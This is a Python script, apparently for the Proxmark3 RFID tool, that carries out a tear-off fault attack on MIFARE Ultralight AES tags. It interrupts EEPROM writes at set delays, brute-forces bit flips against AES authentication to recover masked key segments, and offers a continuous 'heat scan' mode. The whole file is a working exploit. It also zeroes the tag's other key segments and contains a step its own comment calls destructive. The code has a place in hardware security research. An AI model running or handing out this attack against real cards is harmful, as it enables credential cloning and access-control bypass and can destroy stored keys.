#!/usr/bin/env python3

"""Recover the masked key used in Ultralight AES authentication."""

import sys
import argparse
import time
import pm3
from itertools import combinations

# important: if idx=2, we don't target the OriginalityKey but the RFU blocks 56-59

# not fully tested:
# - using extra_keys at best


total_auth = 0


def console_debug(p, command, capture=True, debug=False):
    """Print debug messages to the console if debugging is enabled."""
    if debug:
        print(command)
        sys.stdout.flush()
    p.console(command, capture=capture)


def enumerate_words_with_k_bits_set(n_bits, max_bits_set, mask=0):
    """Generate all n-bit words with up to max_bits_set bits set, respecting a mask."""
    non_masked_positions = [pos for pos in range(n_bits) if not (mask & (1 << pos))]
    yield 0
    for k in range(1, max_bits_set + 1):
        # print(f"Enumerating words with {k} bits set: {len(list(combinations(non_masked_positions, k)))}")
        for bits in combinations(non_masked_positions, k):
            value = 0
            for pos in bits:
                value |= (1 << pos)
            yield value


def hamming_weight(n):
    """Compute the Hamming weight (number of set bits) of an integer."""
    return bin(n).count('1')


def hamming_distance(n, m):
    """Compute the Hamming distance between two integers."""
    return bin(n ^ m).count('1')


def construct_key(key_segment, segment):
    """Construct the full key from the segment and its value."""
    assert segment < 4
    if segment == 0:
        key = f'{key_segment:08x}000000000000000000000000'
    elif segment == 1:
        key = f'00000000{key_segment:08x}0000000000000000'
    elif segment == 2:
        key = f'0000000000000000{key_segment:08x}00000000'
    elif segment == 3:
        key = f'000000000000000000000000{key_segment:08x}'
    return key


def read_block(p, block):
    """Read a block and return the formatted block data as int."""
    # Much quicker than hf mfu rdbl --force
    console_debug(p, f'hf 14a raw -sc 30{block:02x}', debug=debug)
    for line in p.grabbed_output.split('\n'):
        parts = line.split(']')
        if len(parts) == 3:
            data_bytes = parts[1].strip().split()
            if len(data_bytes) >= 16:
                data_int = int(''.join(data_bytes[:4]), 16)
                return data_int
    return None


def auth(p, key_segment, idx, segment, retries=0):
    """Authenticate with the given key, key index and segment."""
    global total_auth
    assert idx < 3
    assert segment < 4
    # if idx=2, we don't target the OriginalityKey but the RFU blocks 56-59
    if idx == 2:
        block_segment = int.from_bytes(key_segment.to_bytes(4, 'big')[::-1], 'big')
        block = None
        while block is None:
            block = read_block(p, 56 + (3 - segment))
        total_auth += 1
        if block != block_segment:
            total_auth += retries
        return block == block_segment
    else:
        key = construct_key(key_segment, segment)
        console_debug(p, f'hf mfu aesauth -i {idx} --key {key} --retries {retries} --nocheck', debug=debug)
        success = False
        for line in p.grabbed_output.split('\n'):
            if "Authentication" in line:
                if "ok" in line:
                    success = True
                if "attempts:" in line:
                    start = line.find(":") + 1
                    attempts = int(line[start:].strip())
                    total_auth += attempts
    return success


def bruteforce_key(p, key_segment, idx, segment, retries=5, bitflips=2, bitflips_list=None, silent=False):
    """Bruteforce the key by flipping bits and checking authentication."""
    global total_auth
    if not silent:
        print(f"Bruteforcing, total attempts: {total_auth}")
    # if idx=2, we don't target the OriginalityKey but the RFU blocks 56-59
    if idx == 2:
        block_segment = int.from_bytes(key_segment.to_bytes(4, 'big')[::-1], 'big')
        block = None
        while block is None:
            block = read_block(p, 56 + (3 - segment))
        # print(f"RFU block read: {block:032b}, from: {block_segment:032b}")
        hd = hamming_distance(block, block_segment)
        if not silent or hd > bitflips:
            print(f"RFU Hamming Distance: {hd}, {'too large' if hd > bitflips else 'OK'}")
        flip = block ^ block_segment
        if flip in bitflips_list:
            total_auth += bitflips_list.index(flip) + 1
            return int.from_bytes(block.to_bytes(4, 'big')[::-1], 'big')
        else:
            total_auth += (retries + 1) * len(bitflips_list)
            return None
    else:
        key = construct_key(key_segment, segment)
        console_debug(p,
                      f'hf mfu aeschk -i {idx} '
                      f'-f mfulaes_segment_hw{bitflips}.dic '
                      f'--segment {segment} '
                      f'--key {key} '
                      f'--retries {retries} '
                      f'--xor '
                      f'--nocheck', debug=debug)
        key = None
        for line in p.grabbed_output.split('\n'):
            if "Error" in line:
                raise RuntimeError(f"Error during bruteforce: {line}")
            if "Authentication attempts:" in line:
                start = line.find(":") + 1
                attempts = int(line[start:].strip())
                total_auth += attempts
            if "found valid key" in line:
                line = line[line.index("key") + 1:]
                start = line.find("[") + 1
                end = line.find("]")
                test_key = int(line[start:end].replace(" ", ""), 16)
                if not silent:
                    print(f"Auth succeeded with key: {test_key:032X}")
                sys.stdout.flush()
                key = (test_key >> (32 * (3 - segment))) & 0xFFFFFFFF
        return key


def insert_key(keys, newkey, initkey):
    """Insert a new key into the list of keys, ensuring no duplicates."""
    if newkey not in keys:
        keys.insert(0, newkey)
        keys.sort(key=lambda k: hamming_distance(k, initkey), reverse=True)
    bigflip = 0
    for key in keys:
        bigflip |= key ^ initkey
    bigkey = initkey ^ bigflip
    if bigkey not in keys:
        keys.insert(0, bigkey)
    return keys


if __name__ == "__main__":
    p = pm3.pm3()

    parser = argparse.ArgumentParser(description="Recover the key used in Ultralight AES authentication")
    parser.add_argument('--eeprom-init', type=lambda x: int(x, 0), default=None,
                        help='Initial key block EEPROM value (hex). def: None')
    parser.add_argument('--final', type=lambda x: int(x, 0), default=0x00000000,
                        help='Final key block value (hex)')
    parser.add_argument('--block', type=lambda x: int(x, 0), required=True,
                        help='Block number (hex or int) DataProt:48-51 UIDRetr:52-55')
    parser.add_argument('--tear1', type=int, default=285,
                        help='First tearoff value (ms)')
    parser.add_argument('--tear2', type=int, default=235,
                        help='Second tearoff value (ms)')
    parser.add_argument('--bitflips', type=int, default=2,
                        help='Maximum bitflips')
    parser.add_argument('--retries', type=int, default=0,
                        help='Number of retries')
    parser.add_argument('--debug', action='store_true',
                        help='Enable debug output')
    parser.add_argument('--heat-scan', action='store_true',
                        help='Enable heat scan mode')
    parser.add_argument('--mask', type=lambda x: int(x, 0), default=0,
                        help='Key mask (16-byte hex)')
    args = parser.parse_args()

    eeprom_init = args.eeprom_init
    final = args.final
    block = args.block
    tear1 = args.tear1
    tear2 = args.tear2
    bitflips = args.bitflips
    retries = args.retries
    heat_scan = args.heat_scan
    debug = args.debug
    segment = 3 - ((block - 48) % 4)
    idx = (block - 48) // 4
    assert idx < 3
    # simulation on RFU blocks, we can read directly the block state
    rfu = idx == 2
    # keep only mask portion we're interested in
    mask = (args.mask >> (32 * (3 - segment))) & 0xFFFFFFFF
    bitflips_list = None
    if rfu:
        mask = 0x00000000
        bitflips_list = list(enumerate_words_with_k_bits_set(32, bitflips))

    if eeprom_init is not None:
        # to get eeprom_init = value really stored in EEPROM, we need to apply the mask
        initkey = int.from_bytes(eeprom_init.to_bytes(4, 'big')[::-1], 'big') ^ mask
        init = eeprom_init ^ int.from_bytes(mask.to_bytes(4, 'big')[::-1], 'big')
    print(f"Block      {block:2d} (0x{block:02X})\n"
          f"Key index  {idx:2d} ({['DataProt', 'UIDRetr', 'RFU'][idx]})\n"
          f"Segment    {segment:2d}\n"
          f"Mask       {mask:08X}")
    ntear2 = 0
    max_hd = 0
    keys = []
    start_time = time.time()

    # Erase the other key segments
    console_debug(p, 'hw tearoff --off', capture=False, debug=debug)
    for i in range(48 + 4*idx, 52 + 4*idx):
        if i == block:
            continue
        console_debug(p, f'hf 14a raw -sc a2{i:02x}00000000', capture=False, debug=debug)

    if eeprom_init is not None:
        if not rfu:
            # Validate mask. Beware, it's destructive for the key to recover, use only for tests
            tear_mask = 1000
            print(f"Validating mask for segment with tearoff value: {tear_mask} ms")
            console_debug(p, f'hw tearoff --delay {tear_mask}', capture=False, debug=debug)
            console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
            console_debug(p, f'hf 14a raw -sc a2{block:02x}{final:08x}', capture=False, debug=debug)
            assert auth(p, mask, idx, segment) == 1, "Mask validation failed, check the mask value."
        # Set key segment for test
        console_debug(p, 'hw tearoff --off', capture=False, debug=debug)
        console_debug(p, f'hf 14a raw -sc a2{block:02x}{init:08x}', capture=False, debug=debug)

    print(f"Testing with initial tearoff value: {tear1} ms")
    console_debug(p, f'hw tearoff --delay {tear1}', capture=False, debug=debug)
    console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
    console_debug(p, f'hf 14a raw -sc a2{block:02x}{final:08x}', capture=False, debug=debug)
    assert auth(p, mask, idx, segment) == 0, "Tear1 too long, key segment already erased"
    console_debug(p, f'hw tearoff --delay {tear2}', capture=False, debug=debug)

    while True:
        print(f"Tears: "f"1*{tear1}ms + {ntear2}*{tear2}ms")
        sys.stdout.flush()
        assert auth(p, mask, idx, segment) == 0, "Tear2 too long, key segment already erased"
        newkey = bruteforce_key(p, mask, idx, segment, retries, bitflips=bitflips, bitflips_list=bitflips_list)
        if newkey is not None:
            print(f"   New key bits found:   {newkey:08X} with HD={hamming_distance(newkey, mask):02d}")
            newkey_masked = newkey ^ mask
            print(f"Masked key bits found:   {newkey_masked:08X}")
            if eeprom_init is not None:
                print(f"     EEPROM bits init:   {eeprom_init:08X} ({eeprom_init:032b})")
            newblock = int.from_bytes(newkey_masked.to_bytes(4, 'big')[::-1], 'big')
            print(f"    EEPROM bits found:   {newblock:08X} ({newblock:032b})")
            maskblock = int.from_bytes(mask.to_bytes(4, 'big')[::-1], 'big')
            print(f"            Mask bits:   {maskblock:08X} ({maskblock:032b})")
            # Recovered key bits: inversed mask bits only if corresponding EEPROM bits are set
            inversed_mask_bits = ''.join(
                '1' if (newblock & (1 << i)) and not (maskblock & (1 << i)) else
                '0' if (newblock & (1 << i)) and (maskblock & (1 << i)) else
                '.'
                for i in range(31, -1, -1)
            )
            print(f" Recovered block bits:             {inversed_mask_bits}")
            if eeprom_init is not None:
                print(f"      Block bits init:   {init:08X} ({init:032b})")
            print(f"Total authentications:   {total_auth}")
            current_time = time.time()
            elapsed_time = current_time - start_time
            minutes, seconds = divmod(elapsed_time, 60)
            print(f"Time spent since start:  {int(minutes)} minutes {seconds:.2f} seconds")
            sys.stdout.flush()
            console_debug(p, 'hw tearoff --off', capture=False, debug=debug)
            # if eeprom_init is not None:
            #     # Erase the key
            #     for i in range(48 + 4*idx, 52 + 4*idx):
            #         console_debug(p, f'hf 14a raw -sc a2{i:02x}00000000', capture=False, debug=debug)
            if eeprom_init is not None:
                assert (newblock) & ~eeprom_init == 0, "Invalid key: EEPROM bits set were not set in EEPROM init?!"
            break

        print(f"Testing with extra tearoff value: {tear2} ms")
        sys.stdout.flush()
        console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
        console_debug(p, f'hf 14a raw -sc a2{block:02x}{final:08x}', capture=False, debug=debug)
        ntear2 += 1
    if heat_scan:
        keys = [newkey]
        lastkey = newkey
        while True:
            while True:
                known_key = False
                for k in keys:
                    if auth(p, k, idx, segment):
                        known_key = True
                        lastkey = k
                if known_key:
                    print(".", end='', flush=True)
                    try:
                        time.sleep(0.1)
                    except KeyboardInterrupt:
                        print("\nInterrupted by user.")
                        sys.exit(0)
                else:
                    break
            print("?", end='', flush=True)
            newkey = bruteforce_key(p, lastkey, idx, segment, retries, bitflips=bitflips, bitflips_list=bitflips_list, silent=True)
            if newkey is not None and newkey not in keys:
                print("\n")
                print(f"   New key bits found:   {newkey:08X} with HD={hamming_distance(newkey, mask):02d}")
                newkey_masked = newkey ^ mask
                print(f"Masked key bits found:   {newkey_masked:08X}")
                if eeprom_init is not None:
                    print(f"     EEPROM bits init:   {eeprom_init:08X} ({eeprom_init:032b})")
                newblock = int.from_bytes(newkey_masked.to_bytes(4, 'big')[::-1], 'big')
                print(f"    EEPROM bits found:   {newblock:08X} ({newblock:032b})")
                maskblock = int.from_bytes(mask.to_bytes(4, 'big')[::-1], 'big')
                print(f"            Mask bits:   {maskblock:08X} ({maskblock:032b})")
                # Recovered key bits: inversed mask bits only if corresponding EEPROM bits are set
                inversed_mask_bits = ''.join(
                    '1' if (newblock & (1 << i)) and not (maskblock & (1 << i)) else
                    '0' if (newblock & (1 << i)) and (maskblock & (1 << i)) else
                    '.'
                    for i in range(31, -1, -1)
                )
                print(f" Recovered block bits:             {inversed_mask_bits}")
                if eeprom_init is not None:
                    print(f"      Block bits init:   {init:08X} ({init:032b})")
                sys.stdout.flush()
                if eeprom_init is not None:
                    assert (newblock) & ~eeprom_init == 0, "Invalid key: EEPROM bits set were not set in EEPROM init?!"
            if newkey is not None:
                lastkey = newkey
                klen = len(keys)
                keys = insert_key(keys, newkey, mask)
                if klen + 1 < len(keys):
                    print(f"   (also inserted combined key: {keys[0]:08X} with HD={hamming_distance(keys[0], mask):02d})")
